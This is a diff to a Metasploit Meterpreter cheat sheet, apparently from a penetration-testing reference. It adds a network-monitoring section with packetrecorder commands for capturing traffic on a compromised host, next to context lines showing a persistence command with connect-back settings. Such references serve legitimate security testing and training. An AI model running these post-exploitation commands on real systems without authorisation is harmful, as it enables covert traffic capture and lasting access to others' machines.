@@ -10,6 +10,7 @@
     * [Meterpreter Webdelivery](#meterpreter-webdelivery)
     * [Get System](#get-system)
     * [Persistence Startup](#persistence-startup)
+    * [Network Monitoring](#network-monitoring)
     * [Portforward](#portforward)
     * [Upload / Download](#upload---download)
     * [Execute from Memory](#execute-from-memory)
@@ -128,6 +129,16 @@ OPTIONS:
 -r <opt>  The IP of the system running Metasploit listening for the connect back
 
 meterpreter > run persistence -U -p 4242
+```
+
+### Network Monitoring
+
+```powershell
+# list interfaces
+run packetrecorder -li
+
+# record interface n°1
+run packetrecorder -i 1
 ```
 
 ### Portforward
